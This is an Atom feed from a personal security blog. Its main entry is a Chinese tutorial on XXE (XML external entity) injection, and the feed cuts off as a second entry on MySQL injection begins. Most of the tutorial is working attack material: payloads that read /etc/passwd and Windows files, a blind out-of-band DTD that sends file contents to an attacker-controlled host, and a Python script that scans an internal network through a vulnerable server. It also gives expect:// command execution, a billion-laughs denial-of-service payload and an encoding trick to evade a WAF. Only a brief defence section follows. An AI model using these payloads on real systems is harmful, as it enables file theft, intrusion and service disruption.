<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>micgo&#39;s blog</title>
  
  
  <link href="https://micgo.top/atom.xml" rel="self"/>
  
  <link href="https://micgo.top/"/>
  <updated>2023-03-23T09:21:47.852Z</updated>
  <id>https://micgo.top/</id>
  
  <author>
    <name>micgo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XXE外部实体注入</title>
    <link href="https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    <id>https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-22T16:00:00.000Z</published>
    <updated>2023-03-23T09:21:47.852Z</updated>
    
    <content type="html"><![CDATA[<p>介绍 XXE 之前，先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞</p><h4 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a><strong>XML基础</strong></h4><p>XML 指可扩展标记语言（Extensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛</p><p>XML 的语法规范由 DTD （Document Type Definition）来进行控制</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>&gt;           //xml声明</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  note [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to, from, heading, body)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to   (#PCDATA)&gt;                     //文档类型定义</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&lt;note&gt;</span></span><br><span class="line"><span class="meta">&lt;to&gt;George&lt;/to&gt;</span></span><br><span class="line"><span class="meta">&lt;from&gt;John&lt;/from&gt;                                 //文档元素</span></span><br><span class="line"><span class="meta">&lt;heading&gt;Reminder&lt;/heading&gt;</span></span><br><span class="line"><span class="meta">&lt;body&gt;Don’t forget the meeting&lt;/body&gt;</span></span><br></pre></td></tr></table></figure><p>#PCDATA：在DTD中，指定某个标签中的内容是字符数据。它的内容需要解析器来解析，需要转换&gt; &lt; &amp; ‘ “这5个特殊字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在DTD中声明：</span><br><span class="line">    &lt;!ELEMENT name (#PCDATA)&gt; </span><br><span class="line">    它表示在&lt;name&gt;和&lt;/name&gt;标签之间可以插入字符或者子标签</span><br></pre></td></tr></table></figure><![CDATA[...]]><p>：内容不必被XML解析器解析时使用<![CDATA[...]]>，经常把程序代码嵌入到<![CDATA[...]]>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在XML中声明：</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">        if(i&lt;10)&#123; System.out.println(&quot;i&lt;10&quot;); &#125;</span><br><span class="line">    ]]&gt;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323090552907.png" alt="image-20230323090552907" style="zoom:45%;" /><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323091338632.png" alt="image-20230323091338632" style="zoom: 80%;" /><p>在解析 XML 时，实体将会被替换成相应的引用内容，xml文档如下所示：</p><p>(1) 包含内部实体的 XML 文档</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323091508406.png" alt="image-20230323091508406" style="zoom:75%;" /><p>(2) 包含外部实体的 XML 文档</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323091526527.png" alt="image-20230323091526527" style="zoom:66%;" /><p>XML 解析器解析外部实体时支持多种协议</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323092806811.png" alt="image-20230323092806811" style="zoom:60%;" /><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>XXE(XML External Entity Injection) 全称 XML外部实体注入，从名字就能看出来这是一个注入漏洞，注入的是XML外部实体</p><p>一般实体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="string">&quot;实体内容&quot;</span>&gt;</span></span><br><span class="line">引用一般实体的方法：&amp;实体名称;</span><br><span class="line">例：</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><p>参数实体：  （在 Blind XXE中起到了至关重要的作用）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">参数实体的声明：<span class="meta">&lt;!ENTITY % 实体名称 <span class="string">&quot;实体内容&quot;</span>&gt;</span></span><br><span class="line">引用参数实体的方法：%实体名称;</span><br><span class="line">例：</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line">        <span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        %dtd;</span></span><br><span class="line"><span class="meta">        %send;</span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br></pre></td></tr></table></figure><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><p>读文件(文件内无特殊符号)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323101903525.png" alt="image-20230323101903525" style="zoom:50%;" /><p>读文件(文件有特殊符号)</p><p>例如下面这个，有&lt;  &gt;等</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323101935886.png" alt="image-20230323101935886" style="zoom:67%;" /><p>用上面那种方法是不成功的，会报错</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323102056593.png" alt="image-20230323102056593" style="zoom: 50%;" /><p>这时就要用到上面说的 CDATA + 参数实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; </span><br><span class="line">]&gt; </span><br><span class="line"></span><br><span class="line">&lt;test&gt;&amp;all;&lt;/test&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">all</span> <span class="string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323103045696.png" alt="image-20230323103045696" style="zoom:67%;" /><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><p>将读取的文件带出来</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [    </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip/xml.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>vps上的xml.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip/?%file;&#x27;&gt;&quot;</span>&gt;</span> %start</span><br></pre></td></tr></table></figure><p><code>&amp;#x25</code>是%的html实体编码，因为在xml.dtd的实体中不能有%</p><p>在日志文件中就能看到读取的文件</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323112919608.png" alt="image-20230323112919608"></p><h5 id="HTTP-内网主机探测"><a href="#HTTP-内网主机探测" class="headerlink" title="HTTP 内网主机探测"></a><strong>HTTP 内网主机探测</strong></h5><p>以存在 XXE 漏洞的服务器为我们探测内网的支点</p><p>要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子(以linux 为例)，可以尝试读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或 &#x2F;proc&#x2F;net&#x2F;arp 或 &#x2F;etc&#x2F;host 文件，就有大致的探测方向了</p><p>探测脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#Origtional XML that the server accepts</span></span><br><span class="line"><span class="comment">#&lt;xml&gt;</span></span><br><span class="line"><span class="comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class="line"><span class="comment">#&lt;/xml&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_xml</span>(<span class="params">string</span>):</span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_xml</span>(<span class="params">xml</span>):</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    coded_string = x.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">2</span>] <span class="comment"># a little split to get only the base64 encoded value</span></span><br><span class="line">    <span class="built_in">print</span> coded_string</span><br><span class="line"><span class="comment">#   print base64.b64decode(coded_string)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = <span class="built_in">str</span>(i)</span><br><span class="line">        ip = <span class="string">&#x27;10.0.0.&#x27;</span> + i</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230323111403028.png" alt="image-20230323111403028" style="zoom: 67%;" /><h5 id="扫描内网端口"><a href="#扫描内网端口" class="headerlink" title="扫描内网端口"></a>扫描内网端口</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:22&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;1&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>至此，我们已经有能力对整个网段进行了一个全面的探测，并能得到内网服务器的一些信息了。如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议范围内，我们就能直接利用 XXE 打内网服务器甚至能直接 getshell（比如有些内网的redis未授权，或者有些通过 http get 请求就能直接getshell例如strus2）</p><h5 id="JSON-XXE"><a href="#JSON-XXE" class="headerlink" title="JSON XXE"></a><strong>JSON XXE</strong></h5><p>很多web和移动应用都基于客户端—服务器交互模式的web通信服务，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE攻击</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">原始请求：</span><br><span class="line"><span class="variable constant_">HTTP</span> <span class="title class_">Request</span>:</span><br><span class="line"><span class="variable constant_">POST</span> /netspi <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: someserver.<span class="property">netspi</span>.<span class="property">com</span></span><br><span class="line"><span class="title class_">Accept</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">38</span></span><br><span class="line">&#123;<span class="string">&quot;search&quot;</span>:<span class="string">&quot;name&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;netspitest&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">原始响应：</span><br><span class="line"><span class="variable constant_">HTTP</span> <span class="title class_">Response</span>:</span><br><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">43</span></span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;no results for name netspitest&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>现在我们尝试将 Content-Type 修改为 application&#x2F;xml</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">进一步请求和响应：</span><br><span class="line"><span class="variable constant_">HTTP</span> <span class="title class_">Request</span>:</span><br><span class="line"><span class="variable constant_">POST</span> /netspi <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: someserver.<span class="property">netspi</span>.<span class="property">com</span></span><br><span class="line"><span class="title class_">Accept</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/xml</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">38</span></span><br><span class="line">&#123;<span class="string">&quot;search&quot;</span>:<span class="string">&quot;name&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;netspitest&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">HTTP</span> <span class="title class_">Response</span>:</span><br><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">500</span> <span class="title class_">Internal</span> <span class="title class_">Server</span> <span class="title class_">Error</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">127</span></span><br><span class="line">&#123;<span class="string">&quot;errors&quot;</span>:&#123;<span class="string">&quot;errorMessage&quot;</span>:<span class="string">&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">最终的请求和响应：</span><br><span class="line">HTTP Request:</span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">netspi</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">search</span>&gt;</span>name<span class="tag">&lt;/<span class="name">search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p><strong>PHP expect RCE</strong></p><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;/file&gt;</span><br><span class="line">&lt;/dir&gt;</span><br></pre></td></tr></table></figure><p><strong>利用 XXE 进行 DOS 攻击</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">     &lt;!DOCTYPE lolz [</span><br><span class="line">     &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">     ]&gt;</span><br><span class="line">     &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>当有waf时，可以采用编码绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1.xml | iconv -f UTF-8 -t UTF-16BE &gt; x16.xml</span><br></pre></td></tr></table></figure><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>1、预定义字符转义</p><p>2、过滤用户提交的XML数据，关键词：SYSTEM和PUBLIC</p><p>3、禁用外部实体：libxml_disable_entity_loader(true);</p><p>你的知识面，决定着你的攻击面</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;介绍 XXE 之前，先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞&lt;/p&gt;
&lt;h4 id=&quot;XML基础&quot;&gt;&lt;a href=&quot;#XML基础&quot; class=&quot;headerlink&quot; title=&quot;XML基础&quot;&gt;&lt;/a&gt;&lt;strong&gt;XML基础</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://micgo.top/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="xxe" scheme="https://micgo.top/tags/xxe/"/>
    
    <category term="xml" scheme="https://micgo.top/tags/xml/"/>
    
  </entry>
  
  <entry>
    <title>MySQL注入写shell</title>
    <link href="https://micgo.top/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/MySQL%E6%B3%A8%E5%85%A5%E5%86%99shell/"/>
